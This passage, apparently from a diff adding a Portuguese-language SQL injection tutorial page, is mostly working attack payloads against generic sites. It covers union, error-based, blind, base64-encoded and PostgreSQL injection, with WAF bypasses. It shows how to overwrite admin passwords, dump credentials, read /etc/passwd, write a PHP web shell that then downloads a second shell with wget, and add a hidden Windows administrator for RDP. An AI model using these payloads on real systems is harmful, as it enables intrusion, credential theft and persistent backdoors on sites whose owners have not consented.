+                    <li><span>Depois do necessário em mãos, vamos editar ! </span></li>
+                    <li><span>Para isto utilizaremos o comando UPDATE, que serve para editar dados já existentes:</span></li>
+                <pre><code>http://site.com/index.php?id=1; UPDATE admin_login set login='admin',senha='21232f297a57a5a743894a0e4a801fc3' where id=1--</code></pre>
+                    <li><span>CASO NÃO FUNCIONE O PRIMEIRO UPDATE...:</span></li>
+                <pre><code>http://site.com/index.php?id=1; UPDATE admin_login set login='admin',senha='admin' where id=1--</code></pre>
+                    <li><span>Bom nós editamos o login com o nome já existente, isto não é necessário, fiz isto somente por questão de organização. Vocês poderia ter feito a alteração sem o login='admin' :</span></li>
+                <pre><code>http://site.com/index.php?id=1; UPDATE admin_login set senha='21232f297a57a5a743894a0e4a801fc3' where id=1--</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Leitura/Escrita SQLI'></a>
+            <legend>Leitura/Escrita SQLI</legend>
+                <ul>
+                    <li><span>Checando se o usuário possue permissão de escrita</span></li>
+                    <li><span>Vamos usar a seguinte query no ID vulnerável para verificar se pssuímos permissão de escrita/leitura:</span></li>
+                <pre><code>select file_priv from mysql.user where user='username' --&gt; onde username deve ser encriptado em Hex (estou usando para isto a hack bar)</code></pre>
+                <pre><code>http://www.site.com/index.php?id=-1+union+select+1,group_concat(file_priv)+from+mysql.user where user=0x637365</code></pre>
+                    <li><span>Sendo:</span></li>
+                <pre><code>user=0x637365 == user=username</code></pre>
+                    <li><span>Ou entao uma query mais didática e simples seria:</span></li>
+                <pre><code>http://www.site.com/index.php?id=-1+union+select+1,group_concat(user,0x3a,file_priv),3,4+from+mysql.user--</code></pre>
+                    <li><span>Enfim,fica a critério do pentester, caso a primeira não funcione teste a segunda...</span></li>
+                    <li><span>Após verificar-mos se possuimos permissão de Leitura//Escrita, vamos pensar oque podemos apreveitar:</span></li>
+                    <li><span>PERMISSÃO DE ESCRITA:</span></li>
+                    <li><span>Podemos enviar uma WebShell para o alvo através da seguinte query:</span></li>
+                <pre><code>SELECT 'CODIGO PEQUENO DA SHELL AQUI ' INTO OUTFILE '/var/www/webshell.php'</code></pre>
+                    <li><span><strong>SELECT</strong>: Devemos colocar o código da shell aqui, no qual geralmente usamos comando system do php como webshell.</span></li>
+                    <li><span><strong>INTO OUTFILE</strong>: Aqui devemos colocar o diretório em que o site se encontra, geralmente podemos ver o diretorio no Debug do error SQLI na própria pagina vulnerável do site.</span></li>
+                    <li><span>OBS: Ou então você pode usar um magic_quote para retornar o patche:  union select 1,";--</span></li>
+                    <li><span>Ficando deste modo:</span></li>
+                <pre><code>http://www.site.com/index.php?id=1 union select 1,"&lt;?php system($_REQUEST['cmd'])?&gt;",3,4 INTO OUTFILE " /var/www/webshell.php "</code></pre>
+                    <li><span>OBS_01: O Uso do Aspas <strong>"</strong> e do apóstrofe <strong>'</strong> é para criar uma maior gama de possibilidades caso os apóstrofes <strong>'</strong> não funcionem, é bom testar aspas comum <strong>"</strong>.</span></li>
+                    <li><span>OBS_02: Caso o site esteja hospedado em um servidor windows eu recomendo utilizar duas barras invertidas no patche: INTO OUTFILE "C:\\host\\htdocs\\shell.php";--</span></li>
+                    <li><span>Depois é só acessar a su WebShell e baixar através dela um outra webshell mais <strong>amigável</strong>:</span></li>
+                <pre><code>http://www.site.com/webshell.php?cmd=wget www.site.com/suashell.txt; mv suashell.txt shell.php</code></pre>
+                    <li><span>PERMISSÃO DE LEITURA </span></li>
+                        <ul>
+                            <li><span>Bom vamos aproveitar que temos a permissão de leitura tambem para fazer um SQL Injection to LFI...</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Podemos visualizar o arquivo <strong>/etc/passwd</strong> onde fica as passwords e os patches de todos os usuários registrados no sistema do linux.</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Através da seguinte query:</span></li>
+                        </ul>
+                <pre><code>+union+select+1,LOAD_FILE(0x2f6574632f706173737764)--  /(CODIFICAÇÃO EM HEX)/</code></pre>
+                <pre><code>+union+select+1,LOAD_FILE(CHAR(47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100))--   /(CODIFICAÇÃO EM CHAR)/</code></pre>
+                        <ul>
+                            <li><span>OBS:Caso não aceite o patche do passwd em string normal, devemos encriptar em Hex ou ate mesmo para CHAR...</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Onde o <strong>/etc/passwd</strong> esta codificado em Hex dentro do parenteses do comando <strong>LOAD_FILE</strong></span></li>
+                        </ul>
+                        <ul>
+                            <li><span>Através disto podemos fazer um reverse ip procurar por sites do servidor que possuam Wordpress ou Joomla e tentar pegar os arquivos de configuração de database dos mesmos (wp-config.php &amp;&amp; configurate.php)</span></li>
+                        </ul>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='SQLI to RDP'></a>
+            <legend>SQLI to RDP</legend>
+                <ul>
+                    <li><span>Adicionando Administrador RDP (Remote Dektop Protocol) BY Shell SQL Injection (system)</span></li>
+                    <li><span>Nós upamos a webshell.php em um site que está hospedado em windows e tambem através do comando user(), verificamos que somos o usuário root ou admin ou administrador, tanto faz o nome...</span></li>
+                    <li><span>E sabemos que  windows suporta o RDP, então vamos dar o comando:</span></li>
+                    <li><span>1- net users -&gt; para saber quais usuários possuem no sistema</span></li>
+                <pre><code>http://www.site.com/weshell.php?cmd=net users</code></pre>
+                    <li><span>2- Agora vamos adicionar uma conta com privilégio máximo(root), para termos acesso ao RDP:</span></li>
+                    <li><span>--&gt; net user cyberhats/add</span></li>
+                <pre><code>http://www.site.com/weshell.php?cmd=net user cyberhats/add</code></pre>
+                    <li><span>Resposta: "Comando completado com sucesso!"</span></li>
+                    <li><span>3- Agora vamos adicionar nosso novo usuario(cyberhats) que no momento não possue permissões no grupo de adminsitradores:</span></li>
+                    <li><span>--&gt; net localgroup administrators cyberhats/add</span></li>
+                <pre><code>http://www.site.com/weshell.php?cmd=net localgroup administrators cyberhats/add</code></pre>
+                    <li><span>Resposta: "Comando completado com sucesso!"</span></li>
+                    <li><span>4- Vamos verificar se o nosso usuário foi incluso com sucesso:</span></li>
+                    <li><span>--&gt; net users</span></li>
+                <pre><code>http://www.site.com/weshell.php?cmd=net users</code></pre>
+                    <li><span>Nesta fase o nosso usuário criado deverá aparecer...</span></li>
+                    <li><span>PRONTO ! Usuário adicionado...</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='SQLI em base64 '></a>
+            <legend>SQLI em base64 </legend>
+                <ul>
+                    <li><span>SQL Injection em url's com ID codificado em base 64</span></li>
+                    <li><span>Existem alguns administradores que utilizam de certas técnicas para tentar barrar a injeção de querys SQL devido a vulnerabilidade de seu website. </span></li>
+                    <li><span>Uma destas técnicas utilizadas por alguns CMS é colocar o id em codificação em base 64. </span></li>
+                    <li><span>Como no exemplo a seguir:</span></li>
+                <pre><code>http://www.site.com/index.php?id=MTU=</code></pre>
+                    <li><span>Podemos verificar que esta encodado em base 64(sem auxilio de decoders online) pelo fato de possuir o caractere <strong>=</strong> que é peculiar neste tipo de codificação.</span></li>
+                    <li><span>Após isto podemos verificar normalmente se o site é vulnerável a injeção SQL:</span></li>
+                <pre><code>http://www.site.com/index.php?id=MTU='</code></pre>
+                    <li><span>Responde o seguinte na página: </span></li>
+                <pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax ..... (VULNERÁVEL)</code></pre>
+                    <li><span>OBS: Podemos ver se está vulnerável ou não tambem se a página ficar blank, ou seja totalmente branca, isto é uma suspeita de vulnerabilidade.</span></li>
+                    <li><span>Bom, vamos exploitar:</span></li>
+                    <li><span>1- Iremos precisar de uma ferramente online com conversão para base64 (www.base64encode.org)</span></li>
+                    <li><span>2- O método utilizado para exploit é o mesmo de um UNION BASED mas a diferença é que temos que encriptar nossas querys para o site aceitá-las.</span></li>
+                    <li><span>3- Testando quantidade de colunas, vamos usar <strong>group by</strong> para determinar a quantidade, em uma requisição sem codificação ficaria :</span></li>
+                <pre><code>group by  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50</code></pre>
+                    <li><span>Mas agora vamos no site de codificar base64(www.base64encode.org) e colamos esta string para que o site aceite.. </span></li>
+                    <li><span>Obtivemos o seguinte resultado:</span></li>
+                <pre><code>MTUrZ3JvdXAgYnkgIDEsMiwzLDQsNSw2LDcsOCw5LDEwLDExLDEyLDEzLDE0LDE1LDE2LDE3LDE4LDE5LDIwLDIxLDIyLDIzLDI0LDI1LDI2LDI3LDI4LDI5LDMwLDMxLDMyLDMzLDM0LDM1LDM2LDM3LDM4LDM5LDQwLDQxLDQyLDQzLDQ0LDQ1LDQ2LDQ3LDQ4LDQ5LDUw=</code></pre>
+                <pre><code>http://www.site.com/index.php?id=MTUrZ3JvdXAgYnkgIDEsMiwzLDQsNSw2LDcsOCw5LDEwLDExLDEyLDEzLDE0LDE1LDE2LDE3LDE4LDE5LDIwLDIxLDIyLDIzLDI0LDI1LDI2LDI3LDI4LDI5LDMwLDMxLDMyLDMzLDM0LDM1LDM2LDM3LDM4LDM5LDQwLDQxLDQyLDQzLDQ0LDQ1LDQ2LDQ3LDQ4LDQ5LDUw=</code></pre>
+                    <li><span>Recebemos o seguinte.... </span></li>
+                <pre><code>Unknow column '11'* 
+    --&gt; Ou seja, o site possue 10 colunas (sempre uma anterior ao resultado exibido, pois o erro ocorreu em 11,ou seja ela não existe.)
+    4- Verificando qual coluna está vulnerável:
+    *UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15</code></pre>
+                    <li><span>Codificando ficaria: </span></li>
+                <pre><code>http://www.site.com/index.php?id=MTUrVU5JT04gU0VMRUNUIDEsMiwzLDQsNSw2LDcsOCw5LDEwLDExLDEyLDEzLDE0LDE1=</code></pre>
+                    <li><span>Recebemos a resposta de que a 3 coluna esta vulnerável, apartir deste ponto o método de exploração é igual ao tutorial de sql injection em union base</span></li>
+                    <li><span>BYPASS Para a Injeção</span></li>
+                    <li><span>Caso tenha um WAF no site ele ira bloquear a sua requisição <strong>UNION SELECT</strong>, mas podemos usar vários bypass com o detalhe de que devemos encriptar em base 64 antes de enviar ao site.</span></li>
+                    <li><span>Vamos a um exemplo:</span></li>
+                <pre><code>http://www.site.com/index.php?id=15+/*!12345UnIon*/+/*!12345SelEct*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15</code></pre>
+                <pre><code>MTUrLyohMTIzNDVVbklvbiovKy8qITEyMzQ1U2VsRWN0Ki8rMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTU=</code></pre>
+                    <li><span>Ficando... </span></li>
+                <pre><code>http://www.site.com/index.php?id=MTUrLyohMTIzNDVVbklvbiovKy8qITEyMzQ1U2VsRWN0Ki8rMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTU=</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Error Based SQLI'></a>
+            <legend>Error Based SQLI</legend>
+                <ul>
+                    <li><span>Usa-se este tipo de injeção em casos <strong>raros</strong> e <strong>peculiares</strong>, podendo assim ser chamado de <strong>Double Query SQLI</strong></span></li>
+                    <li><span>Para identificar quando usaremos este tipo de injeção deve-se obsservar os seguintes errors na hora da injeção <strong>UNION</strong>:</span></li>
+                    <li><span>1) ERROR #1604</span></li>
+                    <li><span>2) The used select Statements have Different Number of Columns</span></li>
+                    <li><span>3) Unknow Column 1 or no Columns at all(in webpage or page source)</span></li>
+                    <li><span>e todos os outros errors relacionados ao <strong>UNION</strong>...</span></li>
+                        <ul>
+                            <li><span>Vamos apresentar as strings para oter informações:</span></li>
+                        </ul>
+                        <ul>
+                            <li><span>PS:Neste tipo de versão não precisa colocar a string dentro da tablea vulnerável, a string de xploit se coloca logo após o ID vulnerável...</span></li>
+                        </ul>
+                    <li><span>VERSAO:</span></li>
+                <pre><code>or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1--</code></pre>
+                    <li><span>DATABASES:</span></li>
+                <pre><code>and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit N,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre>
+                    <li><span>==&gt; limit N,1: altere o N para ir vendo as databases existentes.. </span></li>
+                        <ul>
+                            <li><span>EX:</span></li>
+                        </ul>
+                <pre><code>and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre>
+                        <ul>
+                            <li><span>SUPONHAMOS QUE ACHAMADO A DB: site_db</span></li>
+                        </ul>
+                    <li><span>TABLES:</span></li>
+                <pre><code>and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit N,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre>
+                    <li><span>==&gt; limit N,1: altere o N para ir vendo as tabelas existentes.. </span></li>
+                    <li><span>EX:</span></li>
+                <pre><code>and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre>
+                    <li><span>BOM... Supomos que alterando os valores do <strong>LIMIT</strong>, você achou a tabela chamada <strong>users</strong></span></li>
+                    <li><span>Agora vamos extrair as colunas desta tabela</span></li>
+                    <li><span>COLUMNS:</span></li>
+                <pre><code>and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0xTABLEHEX limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre>
+                    <li><span>PS: Onde esta escrito TABLEHEX vamos usar a toolbar HACK BAR para converter nossa tabela em hex...</span></li>
+                <pre><code>users ==&gt; 7573657273 </code></pre>
+                    <li><span>temos de deixar 0x, ficando: <strong>0x7573657273</strong></span></li>
+                <pre><code>and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x7573657273 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre>
+                    <li><span>==&gt; limit N,1: altere o N para ir vendo as tabelas existentes.. EX:</span></li>
+                <pre><code>and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x7573657273 limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre>
+                    <li><span>Suponhamos que achamos as colunas: <strong>admin</strong>,<strong>senha</strong></span></li>
+                    <li><span>DUMP INFORMATIONS:</span></li>
+                <pre><code>and (select 1 from (select count(*),concat((select(select concat(cast(concat(COLUMN_NAME_1,0x7e,COLUMN_NAME_2) as char),0x7e)) from DATABASENAME.TABLENAME limit N,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre>
+                    <li><span>Devemos alterar os seguintes campos:</span></li>
+                <pre><code>COLUMN_NAME_1 &amp;&amp; COLUMN_NAME_2 admin &amp;&amp; senha</code></pre>
+                <pre><code>DATABASENAME site_db
+TABLENAME users
+limit N,1 1,1</code></pre>
+                    <li><span>Ficando....</span></li>
+                <pre><code>and (select 1 from (select count(*),concat((select(select concat(cast(concat(admin,0x3a,senha) as char),0x3a)) from site_db.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre>
+                    <li><span>Pronto ! Agora se você quiser mais dados só ir alterando o <strong>LIMIT</strong>, caso tenha, irá aparecer ;)</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='PostgreSQL Injection'></a>
+            <legend>PostgreSQL Injection</legend>
+                <ul>
+                    <li><span>Então, PostgreSQL de forma genérica a injeção é bem similar ao Based UNION mas com algumas alterações(Exceto PostgreSQL Based Error)</span></li>
+                <pre><code>http://www.site.com/code?id=10'  ERROR !</code></pre>
+                <pre><code>order by 1-- NO ERROR
+order by 2-- N0 ERROR
+order by 3-- ERRO !!!</code></pre>
+                <pre><code>http://www.site.com/code?id=10 union select NULL,NULL &lt;-- se ir normal é porque não é based error e é postgresql.</code></pre>
+                    <li><span>1º- Pegando versão:</span></li>
+                <pre><code>http://www.site.com/code?id=10 union select NULL,VERSION()</code></pre>
+                    <li><span>ou</span></li>
+                <pre><code>http://www.site.com/code?id=-10 union select NULL,VERSION()</code></pre>
+                    <li><span>2º- Pegando o Current-DB:</span></li>
+                <pre><code>http://www.site.com/code?id=-10 union select NULL,CURRENT_DATABASE()</code></pre>
+                    <li><span>3º- Nome de todas as databases:</span></li>
+                <pre><code>http://www.site.com/code?id=-10 union select NULL,datname from pg_database</code></pre>
+                    <li><span>4º- Pegando Tabelas de alguma DB:</span></li>
+                <pre><code>http://www.site.com/code?id=-10 union select NULL,tablename from pg_tables where schemaname='NOME_DA_DATABASE'</code></pre>
+                    <li><span>5º- pegando Colunas de alguma TABLE:</span></li>
+                <pre><code>http://www.site.com/code?id=-10 union select NULL,column_name from information_schema.columns where table_name='NOME_DA_TABELA'</code></pre>
+                    <li><span>6º- DUMP DAS INFORMAÇÕES !!</span></li>
+                <pre><code>http://www.site.com/code?id=-10 union select NULL,COLUNM1||':'||COLUNM2||':'||COLUNM3 from DB_NAME.TABLE_NAME</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Upando Shell via sql injection(PostgreSQL)'></a>
+            <legend>Upando Shell via sql injection(PostgreSQL)</legend>
+                <ul>
+                    <li><span>Após estudar-mos sobre a injeção básica e o Based Error, vamos ver como upar uma backdoor através de uma vulnerabilidade de SQL Injection em banco de dados PostgreSQL:</span></li>
+                    <li><span>PS: Vamos utilizar a mesma injeção do tutorial passado sobre Injeção básica em PostgreSQL, oque será utilizado já é o DUMP de informações, mas nos iremos encerrar a query e colocar o comando para uparmos a nossa backdoor, como se fosse o INTO OUTFILE do UNION BASED...</span></li>
+                    <li><span>1º- aproveitar o DUMP de informações, encerrar a query e mandar o comando de upload:</span></li>
+                <pre><code>http://www.site.com/code?id=-10 union select NULL,COLUNM1||':'||COLUNM2||':'||COLUNM3 from DB_NAME.TABLE_NAME</code></pre>
+                    <li><span>Código de upload:</span></li>
+                <pre><code>Copy(select '&lt;?php system($_REQUEST['cmd']);?&gt;') to 'C:\www\site\shell.php';</code></pre>
+                    <li><span>Ficando:</span></li>
+                <pre><code>http://www.site.com/code?id=-10 union select NULL,COLUNM1||':'||COLUNM2||':'||COLUNM3 from DB_NAME.TABLE_NAME;Copy(select '&lt;?php system($_REQUEST['cmd']);?&gt;') to 'C:\www\site\shell.php';</code></pre>
+                    <li><span>Você irá precisar do diretório do site, oque em muitas vezes os debug de error sql em PostgreSQL nos mostram..</span></li>
+                    <li><span>Ps: Agora é so acessar no dir onde está upado a sua backdoor... </span></li>
+                    <li><span>http://www.site.com/shell.php?cmd=ipconfig</span></li>
+                    <li><span>SUCESSS !!!</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='PostgreSQL (Based Error)'></a>
+            <legend>PostgreSQL (Based Error)</legend>
+                <ul>
+                    <li><span>Agora vamos para mais um tipo de SQLInjection:</span></li>
+                    <li><span>PostgreSQL, Para este tuto vamos utilizar  hackbar para converter mais para frente INT em CHR (Oracle):</span></li>
+                    <li><span>Bom, não existe um erro específico para postgresql, então quando você colocar o apóstrofe('), basta ler a mensagem de error, caso nela contenha algo relacionado a palavra postgresql error, podemos usar este método:</span></li>
+                    <li><span>1º- Vamos pegar a versão da SGDB (db postgresql):</span></li>
+                <pre><code>http://www.site.com/code.php?id=10 and 1=cast((select version())::text as int)--</code></pre>
+                    <li><span>PS: O método de ler as informações é o mesmo de mssql, irá aparecer as info no próprio debug de error...</span></li>
+                    <li><span>2º- Pegando a quantidade de Databases:</span></li>
+                <pre><code>http://www.site.com/code.php?id=10 and 1=cast( (CHR(60)) ||(select count(*) from information_schema.schemata)::text as int)--</code></pre>
+                    <li><span>3º- Pegando o current-db:</span></li>
+                <pre><code>http://www.site.com/code.php?id=10 and 1=cast((select current_schema())::text as int)--</code></pre>
+                    <li><span>4º- Pegando todas as Databases:</span></li>
+                <pre><code>http://www.site.com/code.php?id=10 and 1=cast((select schema_name from information_schema.schemata limit 1 offset 0)::text as int)--</code></pre>
+                    <li><span>Irá aparecer o nome de uma das databases, para pegar as outras você terá de ir alternando o número do offset, ele serve como se fosse um LIMIT no based UNION:</span></li>
+                <pre><code>--offset 1
+--offset 2
+--offset 3</code></pre>
+                    <li><span>E assim sucessivamente...</span></li>
+                <pre><code>http://www.site.com/code.php?id=10 and 1=cast((select schema_name from information_schema.schemata limit 1 offset 1)::text as int)--</code></pre>
+                <pre><code>http://www.site.com/code.php?id=10 and 1=cast((select schema_name from information_schema.schemata limit 1 offset 2)::text as int)--</code></pre>
+                    <li><span>5º- Agora vamos pegar as tabelas da database desejada:</span></li>
+                    <li><span>PS: Você deve codificar o nome da database em CHR da Oracle, a tool HackBar faz isto bem rápido... </span></li>
+                    <li><span>Supondo que a database seja: <strong>db_site</strong></span></li>
+                <pre><code>http://www.site.com/code.php?id=10 and 1=cast((select table_name from information_schema.tables where table_schema=CHR(100) || CHR(98) || CHR(95) || CHR(115) || CHR(105) || CHR(116) || CHR(101) limit 1 offset 0)::text as int)--</code></pre>
+                    <li><span>Lembrando que devemos alterar o offset como feito para pegar o nome da databases:</span></li>
+                <pre><code>--offset 1
+--offset 2</code></pre>
+                    <li><span>6º-  Pegando as colunas:</span></li>
+                    <li><span>Precisamos saber o nome da tabela e database, então supomos que a database é <strong>db_site</strong> e a tabela é <strong>admin</strong></span></li>
+                    <li><span>PS: Deve-se codificar os dois nomes em CHR-Oracle</span></li>
+                <pre><code>http://www.site.com/code.php?id=10 and 1=cast((select column_name from information_schema.columns where table_schema=CHR(100) || CHR(98) || CHR(95) || CHR(115) || CHR(105) || CHR(116) || CHR(101) and table_name = CHR(97) || CHR(100) || CHR(109) || CHR(105) || CHR(110) limit 1 offset 0)::text as int)--</code></pre>
+                    <li><span>Mesmo esquema com o offset...</span></li>
+                    <li><span>7º- Finalmente, DUMP das info !</span></li>
+                    <li><span>Precismos saber o nome da db,tabela,coluna:</span></li>
+                <pre><code>db:db_site
+table:admin
+coluna:login,senha</code></pre>
+                <pre><code>http://www.site.com/code.php?id=10 and 1=cast((select NOME_COLUNA from NOME_DB.NOME_TABELA)::text as int)--</code></pre>
+                    <li><span>Ficando:</span></li>
+                <pre><code>http://www.site.com/code.php?id=10 and 1=cast((select login from db_site.admin)::text as int)--</code></pre>
+                <pre><code>http://www.site.com/code.php?id=10 and 1=cast((select senha from db_site.admin)::text as int)--</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class='box'>
+            <a name='Blind SQLI MySQL'></a>
+            <legend>Blind SQLI MySQL</legend>
+                <ul>
+                    <li><span>O Sql injection em blind é um método de invasão que não se parece muito com o método comum pois este é mais chato que o normal, isto se deve ao fato que nós perguntamos para o servidor sobre determinados dados e ele nos retorna se é verdadeiro ou falso.</span></li>
+                    <li><span>Esta resposta de verdadeiro ou falso pode ser feito através da página, vamos aprender a verificar se é vulnerável ou não a blind:</span></li>
+                    <li><span>VERIFICANDO(SE É VULNERÁVEL):</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and 1=1 &lt;- carrega normalmente</code></pre>
+                <pre><code>http://www.site.com/news.php?id=5 and 1=2 &lt;- Algum defeito na página = VULNERÁVEL</code></pre>
+                    <li><span>VERSÃO:</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and substring(@@version,1,1)=4</code></pre>
+                    <li><span>Modifique o 4 para 5 para saber se a versão é 5.. Caso não der alteração na página é sinal de Verdadeiro.</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and substring(@@version,1,1)=5</code></pre>
+                    <li><span>VERIFICANDO SUBSELECT:</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and (select 1)=1</code></pre>
+                    <li><span>Se carregar normalmente funciona...</span></li>
+                    <li><span>MYSQL.USER:</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and (select 1 from mysql.user limit 0,1)=1</code></pre>
+                    <li><span>Se carregar normalmente nós temos acesso ao mysql.user, ao load_file e ao  OUTPUT</span></li>
+                    <li><span>ADIVINHANDO TABELAS:</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and (select 1 from users limit 0,1)=1</code></pre>
+                    <li><span>Se carregar normalmente é porque existe, e assim testamos de acordo com sua imaginação !</span></li>
+                <pre><code>wp-users,webuser,user,login,admin,adm,administrator,etc...</code></pre>
+                    <li><span>ADIVINHANDO COLUNAS:</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and (select substring(concat(1,password),1,1) from users limit 0,1)=1</code></pre>
+                    <li><span>Aqui sugerimos que a coluna se chama password. pois ja sabemos que a tabela é users...</span></li>
+                    <li><span>Se carregar normalmente existe esta coluna.</span></li>
+                    <li><span>EXTRAINDO DADOS:</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;95</code></pre>
+                    <li><span>RESPOSTA VERDADEIRA CONTINUAMOS INCREMENTANDO</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;98</code></pre>
+                    <li><span>RESPOSTA VERDADEIRA CONTINUAMOS INCREMENTANDO</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;99</code></pre>
+                    <li><span><strong>FALSO!!!</strong></span></li>
+                    <li><span>Então o primeiro caractere de username é char(99). usando a tabela ascii sabemos que char(99) é a letra 'c'.</span></li>
+                    <li><span>Vamos checaar a segunda letra</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))&gt;99</code></pre>
+                    <li><span>NOTEM QUE AGORA EU MUDEI DE 1,1 PARA 2,1 PARA ACHARMOS O SEGUNDO CARACTERE</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;99</code></pre>
+                    <li><span>RESPOSTA VERDADEIRA CONTINUAMOS INCREMENTANDO </span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;107</code></pre>
+                    <li><span>FALSO, VAMOS POR UM NUMERO MENOR</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;104</code></pre>
+                    <li><span>RESPOSTA VERDADEIRA CONTINUAMOS INCREMENTANDO</span></li>
+                <pre><code>http://www.site.com/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))&gt;105</code></pre>
+                    <li><span>FALSO !!! DENOVO VAMOS CONSULTAR A TABELA E SEGUIR O MESMO PROCESSO, MUDANDO DE 2,1 PARA 3,1</span></li>
+                    <li><span>NÓS SABEMOS DE ACORDO COM A TABELA QUE char(105) É 'i'. NÓS TEMOS 'ci' ...</span></li>
+                    <li><span>QUANDO &gt;0 E DER FALSO SABEMOS QUE EXTRAÍMOS TODO O CONTEÚDO. </span></li>
+                    <li><span>Para não ficar muito bagunçado recomendo fazer o DUMP de uma coluna de cada vez.</span></li>
+                    <li><span>Script Vulnerável a BLIND SQLI:</span></li>
+                <pre><code>&lt;?php
+/* [...] */
+$id = $_GET['id'];
+$sql = "SELECT * FROM noticias WHERE id = '$id'";
+$q = mysql_query($sql);
+
+$r = @mysql_fetch_row($q);
+/[...] /
+?&gt;</code></pre>
+                    <li><span>Como pudemos ver, o script esconde os erros da função <strong>mysql_fetch_row()</strong> utilizandoo operador de controle de erro <strong>@</strong> antes de chamar a função. </span></li>
+                    <li><span>Muitos programadores acreditam que assim eles estarão seguros.</span></li>
+                <pre><code>FALSE: http://www.site.com/index.php?id=10 AND 1=0</code></pre>
+                <pre><code>TRUE: http://www.site.com/index.php?id=10 AND 1=1</code></pre>
+                    <li><span>LOCALIZANDO TABELAS:</span></li>
+                    <li><span>Vamos considerar a tabela como <strong>admin</strong>. O exemplo abaixo retorna <strong>FALSE</strong> porque não existe uma tabela chamada <strong>users</strong>.</span></li>
+                <pre><code>http://www.site.com/index.php?id=10 AND(SELECT Count(*) FROM users)</code></pre>
+                    <li><span>Agora se tentarmos com a tabela 'admin' o site retornaria TRUE:</span></li>
+                <pre><code>http://www.site.com/index.php?id=10 AND(SELECT Count(*) FROM admin)</code></pre>
+                    <li><span>LOCALIZANDO COLUNAS:</span></li>
+                    <li><span>Pegar o conteúdo de uma coluna é bem fácil. O problema, é que tem que adivinhar seu nome:</span></li>
+                    <li><span>O exemplo abaixo retorna FALSE porque a coluna <strong>nick</strong> não existe:</span></li>
+                <pre><code>http://www.site.com/index.php?id=10 AND(SELECT Count(nick) FROM admin)</code></pre>
+                    <li><span>O Site retorna TRUE pois a coluna <strong>password</strong> existe. </span></li>
+                <pre><code>http://www.site.com/index.php?id=10 AND(SELECT Count(password) FROM admin)</code></pre>
+                    <li><span>DUMP:</span></li>
+                    <li><span>Por exemplo, se a senha do admin que está na coluna PASSWORD da tabela ADMIN é <strong>synyster</strong>, vimos que esta senha possui 8 caracteres. </span></li>
+                    <li><span>Agora vamos montar o payload:</span></li>
+                <pre><code>http://www.site.com/index.php?id=10 AND(SELECT length(password) FROM admin where id=1)=4 //FALSE
+http://www.site.com/index.php?id=10 AND(SELECT length(password) FROM admin where id=1)=6 //FALSE
